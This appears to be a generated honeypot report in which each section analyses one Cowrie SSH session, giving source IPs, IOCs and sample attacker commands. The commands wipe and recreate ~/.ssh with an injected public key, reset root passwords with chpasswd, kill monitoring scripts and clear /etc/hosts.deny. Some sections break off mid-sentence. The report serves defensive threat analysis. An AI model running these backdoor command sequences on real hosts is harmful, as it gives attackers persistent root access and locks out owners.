- **Unique Source IPs**: 1
- **Source IPs**: 121.125.70.58

#### Analysis

**Attack Type:** Backdoor installation (persistent remote access via SSH).  
**Objective:** Gain long‑term control of the host by adding a new SSH key and resetting the root password.  
**Techniques:**  
- `chattr -ia` & `lockr` to make `.ssh` immutable, preventing tampering.  
- Creation of `/ssh/authorized_keys` with a custom RSA key (`mdrfckr`).  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `chpasswd` to set the root password (`root:T0cwZKxaACBw`).  
- Killing and removing temporary scripts (`secure.sh`, `auth.sh`) to hide malicious payloads.  
- System reconnaissance commands (CPU, memory, disk usage, uptime, etc.) to gather host info.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **121.125.70.58** (South Korea).  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14uj

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:T0cwZKxaACBw"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 890620c72f5f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 172.191.157.64

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent SSH access and elevate privileges (root).  
**Techniques:**  
- Injected a random RSA public key into `~/.ssh/authorized_keys`.  
- Changed the root password via `chpasswd`.  
- Removed temporary scripts, killed processes (`pkill -9`).  
- Gathered system info (CPU, memory, OS) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- IP: 172.191.157.64  
- RSA key string in the command: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`  
- Root password set to `aQXPc7eeN8Hs`.  

**Threat Level:** High – attacker is attempting to establish a persistent, privileged backdoor.  

**Summary:** The attacker injected an SSH key and changed the root password to create a persistent backdoor on the honeypot, enabling remote access with elevated privileges.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:aQXPc7eeN8Hs"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: f4ab273a0045...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.160.212.122

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged SSH access and root password on the target system.  

**Techniques Used:**  
- Manipulation of `~/.ssh` directory (chmod, chattr, lockr) to prevent tampering.  
- Injection of a custom RSA public key into `authorized_keys`.  
- Setting the root password via `chpasswd`.  
- Killing potential monitoring processes (`sleep`, `secure.sh`, `auth.sh`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.160.212.122** (Indonesia).  
- RSA public key string in `/ssh/authorized_keys` (long base‑64 string).  
- Root password set to “FnEGJQbB6FvR”.  

**Threat Level:** **High** – attacker obtains root access and SSH credentials, enabling full control of the system.  

**Brief Summary:** The attacker installed a backdoor by injecting an SSH key and setting a new root password, effectively gaining privileged access to the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:FnEGJQbB6FvR"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
... (+10 more)
```

---

### Pattern: 8e0c63c44668...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 209.141.62.124

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain persistent remote access via an injected SSH key and gather system information to assess the target.  

**Techniques Used:**
- Manipulation of `.ssh` directory (removing, recreating, setting permissions)  
- Injection of a public‑key into `authorized_keys` (`ssh-rsa … mdrfckr`)  
- Password manipulation attempts via `passwd` (echoing passwords “ollama” and “ct527mo0FUb5”)  
- System reconnaissance commands: CPU info, memory usage, file listings, cron jobs, user identity, OS details.  

**Indicators of Compromise (IOCs):**
- IP: 209.141.62.124 (United States)  
- Public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Password strings: “ollama” and “ct527mo0FUb5”.  

**Threat Level:** Medium – the attacker has established a backdoor but hasn’t yet executed more destructive payloads.  

**Brief Summary:** The attacker injected an SSH key to enable remote access, then performed extensive system reconnaissance, likely preparing for further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "ollama\nct527mo0FUb5\nct527mo0FUb5"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "ollama\nct527mo0FUb5\nct527mo0FUb5\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 61eab2cb227f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 38.41.198.38

#### Analysis

**Attack Type:**  
Backdoor installation with reconnaissance (botnet recruitment)

**Objective:**  
Gain remote SSH access by injecting a new authorized‑key and gather system information for future exploitation or monitoring.

**Techniques & Tools:**
- `chattr -ia` / `lockr -ia` to make the `.ssh` directory immutable.
- Removal of existing `.ssh`, creation of a fresh directory, and insertion of an SSH RSA key into `authorized_keys`.
- Setting permissions (`chmod -R go=`) to restrict access.
- System‑info commands: CPU, memory, disk usage, process listings, crontab, user info.

**Indicators of Compromise (IOCs):**
- **SSH Key:**  
`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFn

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "aryan123\nxVrpFRlsiVik\nxVrpFRlsiVik"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "aryan123\nxVrpFRlsiVik\nxVrpFRlsiVik\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 2ca050a91c79...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 150.95.84.172

#### Analysis

**Attack Type:**  
- **Backdoor installation / Privilege escalation** (with a botnet‑style remote access attempt)

**Objective:**  
- Gain persistent remote control of the honeypot by adding an SSH key to `authorized_keys` and attempting to change the root password, while collecting system information for reconnaissance.

**Techniques & Tools Used:**
- **SSH key injection** (`echo … > ~/.ssh/authorized_keys`)
- **Root password modification** (`chpasswd` via `echo "root:…"|chpasswd|bash`)
- **System reconnaissance** (CPU info, memory usage, file listings, crontab, uptime, etc.)
- **Process manipulation** (`pkill -9`, deletion of temporary scripts)

**Indicators of Compromise (IOCs):**
- IP: 150.95.84.172  
- RSA key string in `authorized_keys` (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`)  
- Commands targeting `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`

**Threat Level:** **High** – The attacker attempts to gain root access and install a backdoor, indicating a sophisticated threat with potential for widespread exploitation.

**Brief Summary:**  
The attacker injected an SSH key into the honeypot’s `authorized_keys` and attempted to change the root password while gathering system data, aiming to establish persistent remote control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ye12EYqkfkxD"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 92229e01913b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 222.107.251.147

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain persistent remote access via SSH (root privileges) for future exploitation or command execution.  

**Techniques & Tools:**
- **SSH Key Injection:** `echo … > ~/.ssh/authorized_keys` – adds a public key to allow remote login.
- **Root Password Reset:** `echo "root:ONeIPe2vvrnf"|chpasswd|bash` – changes root password.
- **Process & File Cleanup:** `rm -rf /tmp/...; pkill -9 ...; echo > /etc/hosts.deny` – removes potential detection files and kills processes.
- **System Information Gathering:** various `cat /proc/cpuinfo`, `free`, `uname`, `top`, etc. to profile the host.

**Indicators of Compromise (IOCs):**
- Attacker IP: 222.107.251.147  
- Injected RSA public key string (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”) – can be hashed or stored for detection.  
- Root password set to “ONeIPe2vvrnf” (hashable).  

**Threat Level:** Medium–High – root access and SSH key injection provide high potential impact.

**Brief Summary:** The attacker installed a backdoor by injecting an SSH key and resetting the root password, enabling persistent remote control on the host.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ONeIPe2vvrnf"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 3168dad46679...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 172.207.18.113

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with a secondary attempt at privilege escalation.  
**Objective:** Gain remote access to the system by adding an SSH key and potentially creating or modifying a privileged account.  
**Techniques:**  
- `chattr`, `lockr` – file attribute manipulation to hide changes.  
- Creation of `.ssh/authorized_keys` with a random RSA key.  
- `passwd` attempts to set new passwords (likely for user creation).  
- System reconnaissance commands (`cpuinfo`, `free`, `uname`, `top`, etc.) to gather host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **172.207.18.113** (Japan)  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File: `.ssh/authorized_keys`

**

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "admin@123\nnhnsPR3unIKk\nnhnsPR3unIKk"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "admin@123\nnhnsPR3unIKk\nnhnsPR3unIKk\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 6257aefab516...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 82.27.116.55

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent remote access (SSH + root) to the system for future exploitation.  
**Techniques:**  
- Injected an SSH public key into `~/.ssh/authorized_keys` and set restrictive permissions (`chmod -R go= ~/.ssh`).  
- Changed root password via `chpasswd`.  
- Used `lockr` and `chattr` to lock files, possibly to prevent tampering.  
- Killed processes (`pkill -9`) and modified `/etc/hosts.deny` to block legitimate connections.  
- Gathered system information (CPU, memory, OS) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- SSH key: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `kadGdSkN15gL`  
- Attacker IP: 82.27.116.55 (Hong Kong)  

**Threat Level:** **High** – root access and persistent backdoor pose significant risk.  

**Brief Summary:** The attacker installed a backdoor by injecting an SSH key and resetting the root password, enabling remote control of the honeypot while gathering system details for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:kadGdSkN15gL"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 9acd3f1b3afd...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 119.203.251.187

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Gain remote SSH access to the host while gathering system information (CPU, memory, OS details) and attempting to alter user credentials.  
**Techniques:**  
- Creation of `.ssh` directory and injection of a malicious SSH key into `authorized_keys`.  
- Use of `chattr`, `lockr`, and `chmod` to hide or protect the key file.  
- System‑info commands (`cat /proc/cpuinfo`, `free -m`, `uname`, `lscpu`, etc.) for reconnaissance.  
- Attempted password change via piping into `passwd`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **119.203.251.187** (South Korea)  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `~/.ssh/authorized_keys`  

**Threat Level:** Medium – the attacker demonstrates moderate sophistication (backdoor installation and system reconnaissance) but does not show evidence of large-scale exploitation or cryptomining.  

**Brief Summary:** The session shows an attacker installing a malicious SSH key to gain remote access, performing basic system reconnaissance, and attempting to change user credentials—indicative of a backdoor deployment aimed at future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\ndFjuZQMwpt9l\ndFjuZQMwpt9l"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\ndFjuZQMwpt9l\ndFjuZQMwpt9l\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: a74bd51a233f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 222.107.251.147

#### Analysis

**1. Attack Type:**  
Backdoor installation / botnet recruitment – the attacker is creating a persistent remote access point on the honeypot.

**2. Objective:**  
Gain full administrative control (root) and enable future remote SSH connections to the system.

**3. Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` to lock file attributes, preventing tampering.
- Injection of a public‑key into `~/.ssh/authorized_keys`.
- `chmod -R go= ~/.ssh` to restrict permissions.
- `echo "root:QzdCAxB3xIci"|chpasswd|bash` to set the root password.
- Removal and killing of temporary scripts (`secure.sh`, `auth.sh`) and denial of hosts via `/etc/hosts.deny`.
- System reconnaissance commands (CPU, memory, OS info).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **222.107.251.147**  
- SSH public key: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Root password: **QzdCAxB3xIci**  

**5. Threat Level:** High – full

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:QzdCAxB3xIci"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 4660b08bbb97...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 121.125.70.58

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise (remote access via SSH).

**2. Objective:**  
Gain persistent, privileged remote access to the system by injecting an SSH public key into `~/.ssh/authorized_keys` and resetting the root password.

**3. Techniques & Tools Used:**
- **SSH Key Injection:** `echo … > ~/.ssh/authorized_keys`
- **Root Password Reset:** `chpasswd` with a new password (`root:2OLyrc1wXNTK`)
- **Directory Manipulation:** `chmod -R go= ~/.ssh`, `rm -rf .ssh`, `mkdir .ssh`
- **Process Termination & File Clearing:** `pkill -9 secure.sh; pkill -9 auth.sh; rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; echo > /etc/hosts.deny; pkill -9 sleep`
- **System Information Gathering:** various `cat /proc/cpuinfo`, `free`, `ls`, `uname`, etc. (likely reconnaissance).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **121.125.70.58**  
- Public SSH key string:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File names: `~/.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`

**5. Threat Level:** **High** – the attacker has established privileged access and potentially can execute arbitrary commands on the system.

**6. Brief Summary:**  
The attacker injected a new SSH key into the honeypot’s `~/.ssh` directory, reset the root password, and performed basic reconnaissance, effectively creating a persistent backdoor for remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:2OLyrc1wXNTK"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: c466a56457c0...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 222.107.251.147

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection (remote access).

**Objective:**  
Gain persistent remote login capability by adding a malicious public key to the victim’s `~/.ssh/authorized_keys` and setting restrictive permissions.

**Techniques & Tools Used:**

- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) to prevent tampering.
- Injection of a hard‑coded RSA public key into `authorized_keys`.
- Permission changes with `chmod -R go= ~/.ssh`.
- System reconnaissance commands (CPU info, memory usage, file listings, crontab, uname, whoami, lscpu, df).

**Indicators of Compromise (IOCs):**

- Attacker IP: **222.107.251.147**
- Public key string in `authorized_keys`:
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File path: `~/.ssh/authorized_keys`
- Permission setting: `chmod -R go= ~/.ssh`

**Threat Level:** **High** – the attacker has established a persistent remote access point and performed system reconnaissance, indicating potential for further exploitation.

**Brief Summary:**  
The attacker injected a malicious SSH key into the victim’s authorized keys and restricted permissions to secure the backdoor, while gathering system information for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\n1VrtBhJCLHND\n1VrtBhJCLHND"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\n1VrtBhJCLHND\n1VrtBhJCLHND\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 967d71646e17...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 121.125.70.58

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection combined with basic system reconnaissance (botnet recruitment or credential theft).

**Objective:**  
Gain remote access to the target machine by adding a valid SSH key, attempt to change user passwords, and collect system details for further exploitation.

**Techniques & Tools Used:**
- `chattr`/`lockr` to hide/lock the `.ssh` directory.
- Creation of an SSH public key in `authorized_keys`.
- Password manipulation via `passwd` (non‑interactive attempts).
- System information queries (`cpuinfo`, `mem`, `ls`, `crontab`, `uname`, `whoami`, `lscpu`, `df`) to gather host details.

**Indicators of Compromise (IOCs):**
- Attacker IP: **121.125.70.58**  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+Bg

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
